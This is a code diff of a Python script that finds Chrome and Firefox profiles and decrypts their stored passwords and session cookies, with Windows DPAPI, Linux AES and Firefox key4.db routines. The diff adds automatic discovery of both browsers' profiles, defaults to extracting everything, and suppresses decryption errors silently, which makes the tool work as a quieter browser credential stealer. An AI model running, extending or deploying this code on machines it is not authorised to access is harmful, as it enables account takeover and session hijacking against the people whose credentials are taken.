@@ -18,6 +18,7 @@ from importlib import import_module
 from pathlib import Path
 
 operatingSystem = str(sys.platform)
+dirFirefox, dirChrome = "",""
 
 if "win" in operatingSystem or "Win" in operatingSystem:
     operatingSystem = "Windows"
@@ -42,7 +43,7 @@ def printNicely(title, credentialsList=[]):
 
 def getChromeCredentials(directory, credentialsType):
 
-    credentialsList = []
+    cookieList,passwordList = [],[]
     
     if (operatingSystem == "Windows"):
 
@@ -56,21 +57,20 @@ def getChromeCredentials(directory, credentialsType):
         if (credentialsType == "cookies" or credentialsType == "all"):
 
             value = queryDatabase(directory, 'Cookies', 'SELECT * FROM cookies')
-
             for data in value:
                 try:
                     decryptedCookie = win32crypt.CryptUnprotectData(data[12], None, None, None, 0)[1]
-                    credentialsList.append({
+                    cookieList.append({
                        'hostname': data[1],
                         'cookieName': data[2],
                         'cookie': str(decryptedCookie)
+                    
                     })
                 except:
-                    printNicely("Couldn't decrypt the Chrome Cookie")
-                    break
+                    pass
+                
       
-            printNicely("Cookies extracted from Chrome", credentialsList)
-            credentialsList = []
+            
 
         if(credentialsType == "passwords" or credentialsType == "all"):
             value = queryDatabase(directory, 'Login Data','SELECT action_url, username_value, password_value FROM logins')
@@ -78,18 +78,15 @@ def getChromeCredentials(directory, credentialsType):
             try:
                 for origin_url, username, password in value:
                     decryptedPassword = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
-                    credentialsList.append({
+                    passwordList.append({
                         'origin_url': origin_url,
                         'username': username,
                         'password': str(decryptedPassword)
                 })
             except:
-                printNicely("Couldn't decrypt the Chrome Passwords")
-                exit()
+                pass
      
-
-            printNicely("Passwords extracted from Chrome", credentialsList)
-            credentialsList = []
+           
         
     else:
 
@@ -123,7 +120,6 @@ def getChromeCredentials(directory, credentialsType):
         if (credentialsType == "cookies" or credentialsType == "all"):
 
             value = queryDatabase(directory, 'Cookies', 'SELECT * FROM cookies')
-
             try: 
                 for data in value:
                     encryptedCookie = data[12][3:] #cookies start with three extra characters (v11)
@@ -131,21 +127,17 @@ def getChromeCredentials(directory, credentialsType):
                     decrypted = cipher.decrypt(encryptedCookie) 
                     decryptedCookie = decrypted.strip().decode('utf8')
 
-                    credentialsList.append({
+                    cookieList.append({
                         'hostname': data[1],
                         'cookieName': data[2],
                         'cookie': str(decryptedCookie)
                     })
             except:
-                printNicely("Couldn't decrypt the Chrome cookies")
-                exit()
+                pass
 
-            printNicely("Cookies extracted from Chrome", credentialsList)
-            credentialsList = []
 
         if (credentialsType == "passwords" or credentialsType == "all"):
             value = queryDatabase(directory, 'Login Data','SELECT action_url, username_value, password_value FROM logins')
-
             try:
                 for origin_url, username, password in value:
                     encryptedPassword = password[3:]
@@ -153,18 +145,16 @@ def getChromeCredentials(directory, credentialsType):
                     decrypted = cipher.decrypt(encryptedPassword)
                     decryptedPassword = decrypted.strip().decode('utf8')
 
-                    credentialsList.append({
+                    passwordList.append({
                         'origin_url': origin_url,
                         'username': username,
                         'password': str(decryptedPassword)
                     })
             except:
-                printNicely("Couldn't decrypt the chrome passwords")
-                exit()
+                pass
     
 
-            printNicely("Passwords extracted from Chrome", credentialsList)
-            credentialsList = []
+    return cookieList, passwordList
    
 
 def queryDatabase(directory, database, query):
@@ -175,29 +165,31 @@ def queryDatabase(directory, database, query):
         value = v.fetchall()
         return (value)
     except:
-        printNicely("Something's wrong with the sqlite database file. Make sure: (i) Google chrome / Firefox is not running while you run this script, \
-(ii) The credential file (Cookies/Login Data/cookies.sqlite/key4.db) path is correct.")
+        printNicely("(-) Something's wrong with the sqlite database file. Make sure Google chrome / Firefox is not running while you run this script")
         exit()
 
 
 
 def getDirectory():
     if (operatingSystem == "Windows"):
-        directory = str(os.environ['USERPROFILE'])+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
-    else:
-        directory = str(Path.home())+'/.config/google-chrome/Default/'
+        dirChrome = str(os.environ['USERPROFILE'])+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
+        for root, dirs, files in os.walk(str(os.environ['USERPROFILE'])+'\\AppData\\Roaming\\Mozilla\\\Firefox\\Profiles\\'):
+            if "key4.db" in files:
+                dirFirefox = os.path.join(root)+'\\'
 
-    if not os.path.isdir(directory):
-        printNicely('We couldn\'t find the chrome diretory; is chrome installed? If you want to extract firefox credentials or enter chrome directory manually, please see help.')
-        exit()
-    return directory
+    else:
+        dirChrome = str(Path.home())+'/.config/google-chrome/Default/'
+        for root, dirs, files in os.walk(str(Path.home())+'/.mozilla/firefox/'):
+            if "key4.db" in files:
+                dirFirefox = os.path.join(root)+'/'
+    return dirChrome, dirFirefox
     
 
 
    
 def getFirefoxCredentials(directory, masterPassword, credentialsType):
 
-    credentialsList = []
+    passwordList,cookieList = [],[]
 
     '''Cookies are not encrypted in Firefox'''
 
@@ -205,14 +197,12 @@ def getFirefoxCredentials(directory, masterPassword, credentialsType):
            
         value = queryDatabase(directory, "cookies.sqlite", "SELECT * FROM moz_cookies")
         for data in value:
-            credentialsList.append({
-                'hostname': data[1],
-                'cookieName': data[3],
-                'cookie': data[4]
+            cookieList.append({
+                'hostname': data[4],
+                'cookieName': data[2],
+                'cookie': data[3]
             })
        
-        printNicely("Cookies extracted from firefox", credentialsList)
-        credentialsList = []
 
 
     if(credentialsType == "passwords" or credentialsType == "all"):
@@ -242,7 +232,7 @@ def getFirefoxCredentials(directory, masterPassword, credentialsType):
                 derEncodedData = item[0]
                 break
             else:
-                print("Wait! Something's wrong with firfox key4.db file. Try Re-running the program and set master password with -p parameter")
+                printNicely("(-) Wait! Something's wrong with firfox key4.db file. Try Re-running the program and set master password with -p parameter")
                 exit()
 
         try: 
@@ -257,21 +247,22 @@ def getFirefoxCredentials(directory, masterPassword, credentialsType):
 
         
             if "logins" not in jsonLogins:
-                print("No logins found in logins.json")
+                printNicely("No logins found in logins.json")
                 exit()
 
             for item in jsonLogins["logins"]:
-                credentialsList.append(
+                passwordList.append(
                     {
                         "URL": item["hostname"],
                         "username" : decodeLoginData(key, item["encryptedUsername"]),
                         "password" : decodeLoginData(key, item["encryptedPassword"]),
                     }
                 )
-            printNicely("Firefox Passwords", credentialsList)
+            return cookieList,passwordList
         
         except:
-            printNicely("Something went wrong with decryption of login data.")
+            pass
+    return cookieList,passwordList
     
 
 def decryptTripleDES(globalSalt, masterPassword, entrySalt, encryptedData):
@@ -311,24 +302,18 @@ def exit():
 def main():
     parser = argparse.ArgumentParser(
 					prog=None, 
-					usage='python3 passwords.py -c cookies -b firefox -d C:\\Users\\username\\..',
+					usage='python3 passwords.py -c cookies -b firefox',
 					description = 'Extract the saved-password from Firefox and Chrome.')
 
     parser.add_argument('-c', '--credentials',
 			default = "all",  
 			choices=["passwords", "cookies", "all"], 
-			help = 'Specify the credentials you want to extract, "passwords", "cookies" or "all"')
+			help = 'Specify the credentials you want to extract, "passwords" or "cookies" or "all"')
 
     parser.add_argument('-b', '--browser', 
-			default = "chrome", 
-			choices=["firefox", "chrome"], 
-			help = 'Specify the broswer, "firefox" or "chrome"')
-
-    parser.add_argument('-d', '--directory', 
-			default = "", 
-			help = 'Specify the direcotry. Look for files "Login Data" (chrome) and "key4.db" (Firefox). \
-				For Chrome the usual directory is: C:\\Users\\%%usernameHere%%\\AppData\Local\\Google\\Chrome\\User Data\\Default\\ \
-				and for Firefox is: ~/.mozilla/firefox/%%xxx%%.default/')
+			default = "all", 
+			choices=["firefox", "chrome", "all"], 
+			help = 'Specify the broswer, "firefox" or "chrome" or "all"')
 
     parser.add_argument('-p', '--password', 
 			default = "", 
@@ -336,21 +321,36 @@ def main():
 
     args = parser.parse_args()
 
-    if args.directory is "" and args.browser == "chrome":
-        args.directory = getDirectory()
-    elif args.directory is "" and args.browser == "firefox":
-        printNicely("For firefox, directory argument is required. See help.")
+    dirChrome, dirFirefox = getDirectory()
+
+    if not os.path.isdir(dirChrome) and not os.path.isdir(dirFirefox):
+        printNicely('(-) Error! the chrome and firefox database files are not found.')
         exit()
-    elif not os.path.isdir(args.directory):
-        printNicely("Wait! {} is not a directory. Try again.".format(args.directory))
-        exit()
-
-
-    if(args.browser == "chrome"):
-            getChromeCredentials(args.directory, args.credentials)
-
     else:
-        getFirefoxCredentials(args.directory, args.password, args.credentials)
+        if not os.path.isdir(dirChrome):
+            printNicely('(-) The chrome database file is not found!')
+        if not os.path.isdir(dirFirefox):   
+            printNicely('(-) The firefox database file is not found!')
+        
+        if os.path.isdir(dirFirefox) and (args.browser == "firefox" or args.browser == "all"):        
+            cookieList,passwordList = getFirefoxCredentials(dirFirefox, args.password, args.credentials)
+            if cookieList:
+                printNicely("(+) Firefox Cookies:", cookieList)
+            if passwordList:
+                printNicely("(+) Firefox Passwords:", passwordList)
+        if os.path.isdir(dirChrome) and (args.browser == "chrome" or args.browser == "all"):
+            cookieList,passwordList = getChromeCredentials(dirChrome, args.credentials)
+            if cookieList:
+                printNicely("(+) Chrome Cookies:", cookieList)
+            if not cookieList and args.credentials == "cookies":
+                printNicely("(-) Couldn't decrypt chrome cookies")
+            if passwordList:
+                printNicely("(+) Chrome Passwords:", passwordList)
+            if not passwordList and args.credentials == "passwords":
+                printNicely("(-) Couldn't decrypt chrome passwords")
+        exit()
+
+
 
 
 if __name__== '__main__':
@@ -362,4 +362,3 @@ if __name__== '__main__':
             sys.exit(0)
         except SystemExit:
             os._exit(0)
-
